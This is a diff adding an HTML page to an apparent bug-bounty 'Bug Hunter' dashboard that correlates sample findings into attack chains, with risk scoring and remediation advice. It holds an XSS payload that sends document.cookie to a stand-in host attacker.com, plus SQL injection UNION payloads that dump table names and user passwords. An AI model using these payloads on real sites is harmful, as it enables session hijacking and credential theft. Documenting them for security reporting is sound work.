@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 4: Attack Chain Correlation - Bug Hunter Framework</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">BUG HUNTER</div>
+                <div class="logo-subtitle">Security Framework v1.0</div>
+            </div>
+            
+            <nav class="nav-menu">
+                <div class="nav-section">
+                    <div class="nav-section-title">Main</div>
+                    <a href="index.html" class="nav-link">
+                        <span class="nav-icon">◈</span>
+                        <span>Dashboard</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">Testing Phases</div>
+                    <a href="recon.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 1: Recon</span>
+                    </a>
+                    <a href="baseline.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 2: Baseline</span>
+                    </a>
+                    <a href="testing.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 3: Testing</span>
+                    </a>
+                    <a href="correlation.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 4: Correlation</span>
+                    </a>
+                    <a href="reports.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 5: Reports</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">System</div>
+                    <a href="settings.html" class="nav-link">
+                        <span class="nav-icon">⚙</span>
+                        <span>Settings</span>
+                    </a>
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Top Header -->
+            <header class="top-header">
+                <div class="breadcrumb">
+                    <a href="index.html" class="breadcrumb-item">Home</a>
+                    <span class="breadcrumb-separator">/</span>
+                    <span class="breadcrumb-item">Phase 4: Attack Chain Correlation</span>
+                </div>
+                
+                <div class="header-actions">
+                    <div class="status-indicator">
+                        <span class="status-dot"></span>
+                        <span>Analysis Active</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Page Content -->
+            <div class="content-container">
+                <!-- Page Header -->
+                <div class="page-header">
+                    <h1 class="page-title">🔗 Phase 4: Attack Chain Correlation</h1>
+                    <p class="page-subtitle">Link vulnerabilities into attack chains and assess business impact</p>
+                </div>
+
+                <!-- Findings Overview -->
+                <div class="grid grid-4">
+                    <div class="stat-card">
+                        <div class="stat-value risk-critical">3</div>
+                        <div class="stat-label">Critical Findings</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value risk-high">5</div>
+                        <div class="stat-label">High Severity</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value risk-medium">7</div>
+                        <div class="stat-label">Medium Severity</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">2</div>
+                        <div class="stat-label">Attack Chains</div>
+                    </div>
+                </div>
+
+                <!-- Attack Chain Visualization -->
+                <div class="card glow-green">
+                    <div class="card-header">
+                        <h2 class="card-title">🎯 Attack Chain #1: Account Takeover via XSS → Session Hijacking</h2>
+                        <span class="badge badge-danger">CRITICAL</span>
+                    </div>
+                    <div class="card-body">
+                        <!-- Attack Chain Diagram -->
+                        <div style="background: var(--bg-secondary); padding: 2rem; border-radius: 8px; border: 1px solid var(--neon-green);">
+                            <div class="code-block">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                          ATTACK CHAIN FLOW                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  [1] Reflected XSS                    [2] Cookie Theft                      │
+│  ┌─────────────────┐                  ┌──────────────────┐                 │
+│  │ Finding: XSS-001│  ══════════════>  │ Missing HttpOnly │                 │
+│  │ Location: /search│                  │ on session cookie│                 │
+│  │ Severity: HIGH  │                  │ Severity: MEDIUM │                 │
+│  └─────────────────┘                  └──────────────────┘                 │
+│         │                                      │                            │
+│         │                                      │                            │
+│         v                                      v                            │
+│  [3] Session Hijacking                [4] Account Takeover                  │
+│  ┌─────────────────┐                  ┌──────────────────┐                 │
+│  │ Steal session ID│  ══════════════>  │ Full account     │                 │
+│  │ via XSS payload │                  │ compromise       │                 │
+│  │ CVSS: 7.5       │                  │ CVSS: 9.3        │                 │
+│  └─────────────────┘                  └──────────────────┘                 │
+│                                                                             │
+│  COMBINED IMPACT: Critical - Full account takeover possible                 │
+│  BUSINESS RISK: Customer data breach, financial loss, reputation damage    │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            </div>
+                        </div>
+
+                        <!-- Chain Details -->
+                        <div class="mt-3">
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">Attack Steps:</h3>
+                            
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong class="risk-high">Step 1: Exploit Reflected XSS</strong>
+                                    <span class="badge badge-danger">Finding: XSS-001</span>
+                                </div>
+                                <div class="text-secondary mb-2">
+                                    Attacker sends malicious link to victim with XSS payload in search parameter.
+                                </div>
+                                <div class="code-block">
+https://example.com/search?q=<script>
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
+                                </div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong class="risk-medium">Step 2: Steal Session Cookie</strong>
+                                    <span class="badge badge-warning">Finding: COOKIE-001</span>
+                                </div>
+                                <div class="text-secondary mb-2">
+                                    XSS payload executes and steals session cookie (missing HttpOnly protection).
+                                </div>
+                                <div class="code-block">
+// Victim's session cookie sent to attacker
+sessionId=abc123def456; Path=/; Secure
+                                </div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong class="risk-critical">Step 3: Session Hijacking & Account Takeover</strong>
+                                    <span class="badge badge-danger">CRITICAL IMPACT</span>
+                                </div>
+                                <div class="text-secondary mb-2">
+                                    Attacker uses stolen session cookie to impersonate victim and gain full account access.
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Business Impact -->
+                        <div class="alert alert-danger">
+                            <span class="alert-icon">⚠</span>
+                            <div>
+                                <strong>Business Impact:</strong> 
+                                <ul style="margin-top: 0.5rem; margin-left: 1.5rem;">
+                                    <li>Unauthorized access to user accounts</li>
+                                    <li>Potential data breach affecting customer PII</li>
+                                    <li>Financial transactions can be performed as victim</li>
+                                    <li>Reputation damage and loss of customer trust</li>
+                                    <li>Regulatory compliance violations (GDPR, PCI-DSS)</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Attack Chain #2 -->
+                <div class="card glow-red">
+                    <div class="card-header">
+                        <h2 class="card-title">🎯 Attack Chain #2: SQL Injection → Data Exfiltration → Privilege Escalation</h2>
+                        <span class="badge badge-danger">CRITICAL</span>
+                    </div>
+                    <div class="card-body">
+                        <div style="background: var(--bg-secondary); padding: 2rem; border-radius: 8px; border: 1px solid var(--neon-red);">
+                            <div class="code-block">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     SQL INJECTION ATTACK CHAIN                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  [1] SQL Injection                    [2] Database Enumeration              │
+│  ┌─────────────────┐                  ┌──────────────────┐                 │
+│  │ Finding: SQLi-001│ ══════════════>  │ Extract schema   │                 │
+│  │ Location: /user │                  │ and table names  │                 │
+│  │ Type: Error-based│                  │                  │                 │
+│  └─────────────────┘                  └──────────────────┘                 │
+│         │                                      │                            │
+│         │                                      │                            │
+│         v                                      v                            │
+│  [3] Data Extraction                  [4] Admin Access                      │
+│  ┌─────────────────┐                  ┌──────────────────┐                 │
+│  │ Dump user table │  ══════════════>  │ Extract admin    │                 │
+│  │ passwords & PII │                  │ credentials      │                 │
+│  │                 │                  │ Hash cracking    │                 │
+│  └─────────────────┘                  └──────────────────┘                 │
+│                                              │                              │
+│                                              v                              │
+│                                       [5] Privilege Escalation              │
+│                                       ┌──────────────────┐                 │
+│                                       │ Login as admin   │                 │
+│                                       │ Full system      │                 │
+│                                       │ compromise       │                 │
+│                                       └──────────────────┘                 │
+│                                                                             │
+│  COMBINED IMPACT: Critical - Complete database & system compromise         │
+│  BUSINESS RISK: Massive data breach, regulatory fines, legal liability     │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            </div>
+                        </div>
+
+                        <div class="mt-3">
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">Exploitation Path:</h3>
+                            
+                            <div class="grid grid-2">
+                                <div>
+                                    <strong>Initial Foothold:</strong>
+                                    <div class="code-block mt-2">
+' UNION SELECT table_name 
+FROM information_schema.tables--
+                                    </div>
+                                </div>
+                                <div>
+                                    <strong>Data Extraction:</strong>
+                                    <div class="code-block mt-2">
+' UNION SELECT username, 
+password FROM users--
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="alert alert-danger mt-3">
+                            <span class="alert-icon">⚠</span>
+                            <div>
+                                <strong>Critical Business Impact:</strong> Complete database compromise affecting all users. 
+                                Potential for data breach notification requirements, regulatory fines up to 4% of annual revenue (GDPR), 
+                                and permanent reputation damage.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Confidence Dashboard -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📊 Confidence & Reliability Scoring</h2>
+                    </div>
+                    <div class="card-body">
+                        <table class="table">
+                            <thead>
+                                <tr>
+                                    <th>Finding ID</th>
+                                    <th>Vulnerability</th>
+                                    <th>Evidence Quality</th>
+                                    <th>Reproducibility</th>
+                                    <th>Confidence</th>
+                                    <th>Status</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="monospace">XSS-001</td>
+                                    <td>Reflected XSS in search</td>
+                                    <td>
+                                        <div class="progress" style="margin: 0;">
+                                            <div class="progress-bar" style="width: 100%"></div>
+                                        </div>
+                                    </td>
+                                    <td><span class="badge badge-success">100%</span></td>
+                                    <td><span class="badge badge-success">CONFIRMED</span></td>
+                                    <td><span class="badge badge-danger">ACTIVE</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">SQLi-001</td>
+                                    <td>Error-based SQL Injection</td>
+                                    <td>
+                                        <div class="progress" style="margin: 0;">
+                                            <div class="progress-bar" style="width: 100%"></div>
+                                        </div>
+                                    </td>
+                                    <td><span class="badge badge-success">100%</span></td>
+                                    <td><span class="badge badge-success">CONFIRMED</span></td>
+                                    <td><span class="badge badge-danger">ACTIVE</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">COOKIE-001</td>
+                                    <td>Missing HttpOnly flag</td>
+                                    <td>
+                                        <div class="progress" style="margin: 0;">
+                                            <div class="progress-bar" style="width: 90%"></div>
+                                        </div>
+                                    </td>
+                                    <td><span class="badge badge-success">100%</span></td>
+                                    <td><span class="badge badge-success">CONFIRMED</span></td>
+                                    <td><span class="badge badge-danger">ACTIVE</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">CORS-001</td>
+                                    <td>CORS Misconfiguration</td>
+                                    <td>
+                                        <div class="progress" style="margin: 0;">
+                                            <div class="progress-bar" style="width: 85%"></div>
+                                        </div>
+                                    </td>
+                                    <td><span class="badge badge-success">95%</span></td>
+                                    <td><span class="badge badge-info">FIRM</span></td>
+                                    <td><span class="badge badge-warning">REVIEW</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">SSTI-001</td>
+                                    <td>Potential SSTI</td>
+                                    <td>
+                                        <div class="progress" style="margin: 0;">
+                                            <div class="progress-bar" style="width: 70%"></div>
+                                        </div>
+                                    </td>
+                                    <td><span class="badge badge-warning">80%</span></td>
+                                    <td><span class="badge badge-warning">TENTATIVE</span></td>
+                                    <td><span class="badge badge-info">INVESTIGATING</span></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Risk Matrix -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📈 Risk Matrix & Prioritization</h2>
+                    </div>
+                    <div class="card-body">
+                        <div style="background: var(--bg-secondary); padding: 2rem; border-radius: 8px;">
+                            <div style="text-align: center; margin-bottom: 1rem;">
+                                <strong style="color: var(--neon-green);">IMPACT vs LIKELIHOOD MATRIX</strong>
+                            </div>
+                            <div class="code-block">
+                LIKELIHOOD
+                ↓
+     HIGH  │  MEDIUM  │  HIGH    │  CRITICAL │  CRITICAL │
+           ├──────────┼──────────┼───────────┼───────────┤
+   MEDIUM  │  LOW     │  MEDIUM  │  HIGH     │  CRITICAL │
+           ├──────────┼──────────┼───────────┼───────────┤
+     LOW   │  LOW     │  LOW     │  MEDIUM   │  HIGH     │
+           └──────────┴──────────┴───────────┴───────────┘
+                LOW      MEDIUM     HIGH      CRITICAL
+                                                       IMPACT →
+
+PLACEMENT:
+• [SQLi-001]: CRITICAL Impact, HIGH Likelihood = CRITICAL RISK
+• [XSS-001]: HIGH Impact, HIGH Likelihood = CRITICAL RISK  
+• [COOKIE-001]: MEDIUM Impact, HIGH Likelihood = HIGH RISK
+• [CORS-001]: MEDIUM Impact, MEDIUM Likelihood = MEDIUM RISK
+• [SSTI-001]: CRITICAL Impact, LOW Likelihood = HIGH RISK
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Finding Correlation Links -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">🔗 Finding Correlation Links</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <strong class="text-primary">XSS-001 → COOKIE-001:</strong>
+                            <div class="text-secondary mt-1">
+                                Reflected XSS can exploit missing HttpOnly flag to steal session cookies.
+                                Combined severity escalated from HIGH to CRITICAL.
+                            </div>
+                        </div>
+
+                        <div class="mb-3">
+                            <strong class="text-primary">SQLi-001 → AUTH-001:</strong>
+                            <div class="text-secondary mt-1">
+                                SQL injection enables extraction of password hashes, weak hashing algorithm makes 
+                                credential compromise trivial. Chain enables admin access.
+                            </div>
+                        </div>
+
+                        <div class="mb-3">
+                            <strong class="text-primary">CORS-001 → XSS-001:</strong>
+                            <div class="text-secondary mt-1">
+                                Permissive CORS policy amplifies XSS impact by allowing cross-origin data exfiltration.
+                            </div>
+                        </div>
+
+                        <div class="mb-3">
+                            <strong class="text-primary">CSRF-001 → IDOR-001:</strong>
+                            <div class="text-secondary mt-1">
+                                CSRF can be used to trigger IDOR vulnerabilities, enabling unauthorized data modification.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Business Impact Summary -->
+                <div class="card glow-red">
+                    <div class="card-header">
+                        <h2 class="card-title">💼 Executive Business Impact Summary</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="grid grid-2">
+                            <div>
+                                <h3 style="color: var(--neon-red); margin-bottom: 1rem;">Critical Risks:</h3>
+                                <ul style="margin-left: 1.5rem; color: var(--text-secondary);">
+                                    <li>Complete account takeover capability</li>
+                                    <li>Full database compromise possible</li>
+                                    <li>Customer PII exposure risk</li>
+                                    <li>Payment information at risk</li>
+                                    <li>Regulatory compliance violations</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <h3 style="color: var(--neon-red); margin-bottom: 1rem;">Business Consequences:</h3>
+                                <ul style="margin-left: 1.5rem; color: var(--text-secondary);">
+                                    <li>GDPR fines: Up to €20M or 4% revenue</li>
+                                    <li>PCI-DSS non-compliance penalties</li>
+                                    <li>Data breach notification costs</li>
+                                    <li>Customer trust & reputation loss</li>
+                                    <li>Potential legal liability</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="mt-3">
+                            <strong style="color: var(--neon-green);">Recommended Immediate Actions:</strong>
+                            <ol style="margin-left: 1.5rem; margin-top: 0.5rem; color: var(--text-secondary);">
+                                <li>Disable affected search functionality until XSS is patched</li>
+                                <li>Implement input validation and output encoding</li>
+                                <li>Add HttpOnly and SameSite flags to all session cookies</li>
+                                <li>Deploy parameterized queries to prevent SQL injection</li>
+                                <li>Implement Content Security Policy (CSP) header</li>
+                                <li>Restrict CORS to specific trusted origins</li>
+                                <li>Conduct emergency security code review</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Actions -->
+                <div class="card">
+                    <div class="card-body flex gap-2">
+                        <a href="reports.html" class="btn btn-primary">
+                            <span>➜</span>
+                            <span>Proceed to Phase 5: Report Builder</span>
+                        </a>
+                        <button class="btn btn-secondary">
+                            <span>💾</span>
+                            <span>Export Correlation Data</span>
+                        </button>
+                        <button class="btn btn-secondary">
+                            <span>📊</span>
+                            <span>Generate Executive Summary</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="../js/app.js"></script>
+</body>
+</html>
